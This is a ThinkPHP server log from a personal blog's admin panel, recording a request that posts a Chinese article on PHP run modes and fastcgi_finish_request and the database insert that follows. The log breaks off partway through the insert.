[ info ] [ RUN ] app\admin\controller\Article->add_article[ /yjdata/www/hhqblog/application/admin/controller/Article.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/admin/view/article/add_article.html [ array (
  0 => 'cates',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000311s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article_cate` [ RunTime:0.000810s ]
[ sql ] [ SQL ] SELECT `id`,`name` FROM `think_article_cate` [ RunTime:0.000228s ]

---------------------------------------------------------------
[ 2017-08-10T17:27:08+08:00 ] 172.17.180.47 123.233.116.122 POST /admin/article/add_article.html
[ log ] hhqblog.com/admin/article/add_article.html [运行时间：0.102568s][吞吐率：9.75req/s] [内存消耗：3,731.78kb] [文件加载：61]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'article',
    2 => 'add_article',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'hhqblog.com',
  'connection' => 'keep-alive',
  'content-length' => '130656',
  'accept' => 'application/json, text/javascript, */*; q=0.01',
  'origin' => 'http://hhqblog.com',
  'x-requested-with' => 'XMLHttpRequest',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
  'content-type' => 'multipart/form-data; boundary=----WebKitFormBoundaryOeTNwkz2Z9xVQa7O',
  'referer' => 'http://hhqblog.com/admin/article/add_article.html',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => '_pk_id.1.3fef=5dce351e789a92be.1500950707.10.1502335368.1502335210.',
)
[ info ] [ PARAM ] array (
  'title' => 'PHP fastcgi_finish_request 方法',
  'cate_id' => '12',
  'type' => '0',
  'keyword' => 'PHP fastcgi_finish_request 方法',
  'remark' => '本文介绍，PHP运行在FastCGI模式时，FPM提供的方法：fastcgi_finish_request。
在说这个方法之前，我们先了解PHP有哪些常用的运行模式？',
  'content' => '<p style="box-sizing: border-box; margin-top: 0px; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">本文介绍，PHP运行在FastCGI模式时，FPM提供的方法：fastcgi_finish_request。</p><p style="box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">在说这个方法之前，我们先了解PHP有哪些常用的运行模式？</p><blockquote style="box-sizing: border-box; padding: 10px 20px; margin: 1.5em 0px; font-size: 14px; border-left: 2px solid rgb(0, 154, 97); background: rgb(246, 246, 246); color: rgb(85, 85, 85); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; white-space: normal;"><p style="box-sizing: border-box; margin-top: 0px; margin-bottom: 0px;">PHP运行模式</p></blockquote><p style="box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><strong style="box-sizing: border-box;">CGI 通用网关接口 / Common Gateway Interface</strong></p><p style="box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">CGI已经是比较老的模式了，这几年都很少用了。</p><p style="box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">介绍：每有一个用户请求，都会先要创建CGI的子进程，然后处理请求，处理完后结束这个子进程，这就是Fork-And-Execute模式。</p><p style="box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">当用户请求数量非常多时，会大量挤占系统的资源如内存，CPU时间等。</p><p style="box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">缺点：在高访问需求的情况下，CGI的进程Fork就会成为很大的服务器负担。</p><p style="box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><strong style="box-sizing: border-box;">FastCGI（常驻型CGI / Long-Live CGI）</strong></p><p style="box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">使用的比较多。</p><p style="box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">介绍：FastCGI是CGI的升级版本，FastCGI像是一个常驻 (long-live)型的 CGI。</p><p style="box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">它可以一直执行着，只要激活后，不会每次都要花费时间去 Fork 一次。</p><p style="box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">FastCGI是一个可伸缩地、高速地在HTTP server和动态脚本语言间通信的接口。</p><p style="box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">Apache、Nginx、lighttpd 等流行的 HTTP server 都支持FastCGI。</p><p style="box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">原理：</p><p style="box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">1.Web Server启动时载入FastCGI进程管理器（PHP-FPM）；</p><p style="box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">2.FastCGI进程管理器初始化启动多个CGI解释器进程并等待来自Web Server的连接；</p><p style="box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">3.当客户端请求到达Web Server时，FastCGI进程管理器选择并连接到一个CGI解释器；</p><p style="box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">4.Web server将CGI环境变量和标准输入发送到FastCGI子进程php-cgi；</p><p style="box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">5.FastCGI子进程完成处理后将标准输出和错误信息从同一连接返回Web Server。</p><p style="box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">当FastCGI子进程关闭连接时，请求便告处理完成。</p><p style="box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">FastCGI子进程接着等待并处理来自FastCGI进程管理器的下一个连接。</p><p style="box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><strong style="box-sizing: border-box;">CLI模式</strong></p><p style="box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">介绍：PHP-CLI是PHP Command Line Interface的简称，就是PHP在命令行中运行。</p><p style="box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">Windows、Linux下都支持PHP-CLI模式。</p><p style="box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><strong style="box-sizing: border-box;">模块模式</strong></p><p style="box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">介绍：模块模式是以mod_php5模块的形式集成的。</p><p style="box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">mod_php5模块的作用是接收Apache传递过来的PHP文件请求，并处理这些请求，然后将处理后的结果返回给Apache。</p><p style="box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">Apache的配置文件httpd.conf中添加一行：</p><pre class="hljs smali" style="box-sizing: border-box; overflow: auto; font-family: &quot;Source Code Pro&quot;, Consolas, Menlo, Monaco, &quot;Courier New&quot;, monospace; font-size: 0.93em; padding: 1em; margin-bottom: 1.5em; line-height: 1.45; word-break: break-all; word-wrap: break-word; color: rgb(51, 51, 51); border: none; border-radius: 4px; max-height: 35em; position: relative; margin-top: 0px !important;">LoadModule&nbsp;php5_module&nbsp;modules/mod_php5.so</pre><p style="box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">以上只是简单的让大家了解下，如果有兴趣可以查阅相关文章。</p><p style="box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">接下来，我们来介绍：fastcgi_finish_request。</p><blockquote style="box-sizing: border-box; padding: 10px 20px; margin: 1.5em 0px; font-size: 14px; border-left: 2px solid rgb(0, 154, 97); background: rgb(246, 246, 246); color: rgb(85, 85, 85); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; white-space: normal;"><p style="box-sizing: border-box; margin-top: 0px; margin-bottom: 0px;">fastcgi_finish_request</p></blockquote><p style="box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">PHP运行在FastCGI模式时，FPM提供的方法：fastcgi_finish_request。</p><p style="box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">官方地址：<a href="http://php.net/manual/zh/function.fastcgi-finish-request.php" target="_blank" style="box-sizing: border-box; background: transparent; color: rgb(0, 154, 97); text-decoration-line: none; outline: 0px;">http://php.net/manual/zh/func...</a></p><p style="box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">官方解释：冲刷(flush)所有响应的数据给客户端。</p><p style="box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">个人理解：在调用方法的时候，会发送响应，关闭连接，但是不会结束PHP的运行。</p><p style="box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">不理解的可以直接运行如下代码：</p><pre class="hljs sqf" style="box-sizing: border-box; overflow: auto; font-family: &quot;Source Code Pro&quot;, Consolas, Menlo, Monaco, &quot;Courier New&quot;, monospace; font-size: 0.93em; padding: 1em; margin-bottom: 1.5em; line-height: 1.45; word-break: break-all; word-wrap: break-word; color: rgb(51, 51, 51); border: none; border-radius: 4px; max-height: 35em; position: relative; margin-top: 0px !important;">//代码：
echo&nbsp;date(&#39;Y-m-d&nbsp;H:i:s&#39;,&nbsp;time()).&quot;\\r\\n&quot;;&nbsp;//会输出
fastcgi_finish_request();
set_time_limit(0);&nbsp;&nbsp;//避免超时报错
ini_set(&#39;memory_limit&#39;,&nbsp;&#39;-1&#39;);&nbsp;&nbsp;//避免内存不足
sleep(5);
$time&nbsp;=&nbsp;date(&#39;Y-m-d&nbsp;H:i:s&#39;,&nbsp;time()).&quot;\\r\\n&quot;;
echo&nbsp;$time;&nbsp;//不会输出
file_put_contents(&#39;test.txt&#39;,&nbsp;$time,&nbsp;FILE_APPEND);</pre><p style="box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">执行这段函数后你会发现，可以实现异步操作，提高响应速度。</p><p style="box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">可以使用fastcgi_finish_request()函数集成队列，可以把消息异步发送到队列。</p><p style="box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">因为这个函数只在FastCGI模式下存在，考虑可移植性可以加上以下代码：</p><pre class="hljs actionscript" style="box-sizing: border-box; overflow: auto; font-family: &quot;Source Code Pro&quot;, Consolas, Menlo, Monaco, &quot;Courier New&quot;, monospace; font-size: 0.93em; padding: 1em; margin-bottom: 1.5em; line-height: 1.45; word-break: break-all; word-wrap: break-word; color: rgb(51, 51, 51); border: none; border-radius: 4px; max-height: 35em; position: relative; margin-top: 0px !important;">if&nbsp;(!function_exists(&quot;fastcgi_finish_request&quot;))&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;fastcgi_finish_request()&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
}</pre><p style="box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">大家可以根据自己的情况，进行尝试使用。</p><p><br/></p>',
  'is_tui' => '1',
  'status' => '1',
  'views' => '1',
  'auth' => '韩会强',
)
[ info ] [ RUN ] app\admin\controller\Article->add_article[ /yjdata/www/hhqblog/application/admin/controller/Article.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000291s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000847s ]
[ sql ] [ SQL ] INSERT INTO `think_article` (`title` , `cate_id` , `type` , `keyword` , `remark` , `content` , `is_tui` , `status` , `views` , `auth` , `photo` , `ip` , `update_time` , `create_time`) VALUES ('PHP fastcgi_finish_request 方法' , 12 , 0 , 'PHP fastcgi_finish_request 方法' , '本文介绍，PHP运行在FastCGI模式时，FPM提供的方法：fastcgi_finish_request。\r\n在说这个方法之前，我们先了解PHP有哪些常用的运行模式？' , '<p style=\"box-sizing: border-box; margin-top: 0px; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">本文介绍，PHP运行在FastCGI模式时，FPM提供的方法：fastcgi_finish_request。</p><p style=\"box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">在说这个方法之前，我们先了解PHP有哪些常用的运行模式？</p><blockquote style=\"box-sizing: border-box; padding: 10px 20px; margin: 1.5em 0px; font-size: 14px; border-left: 2px solid rgb(0, 154, 97); background: rgb(246, 246, 246); color: rgb(85, 85, 85); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; white-space: normal;\"><p style=\"box-sizing: border-box; margin-top: 0px; margin-bottom: 0px;\">PHP运行模式</p></blockquote><p style=\"box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><strong style=\"box-sizing: border-box;\">CGI 通用网关接口 / Common Gateway Interface</strong></p><p style=\"box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">CGI已经是比较老的模式了，这几年都很少用了。</p><p style=\"box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">介绍：每有一个用户请求，都会先要创建CGI的子进程，然后处理请求，处理完后结束这个子进程，这就是Fork-And-Execute模式。</p><p style=\"box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">当用户请求数量非常多时，会大量挤占系统的资源如内存，CPU时间等。</p><p style=\"box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">缺点：在高访问需求的情况下，CGI的进程Fork就会成为很大的服务器负担。</p><p style=\"box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><strong style=\"box-sizing: border-box;\">FastCGI（常驻型CGI / Long-Live CGI）</strong></p><p style=\"box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 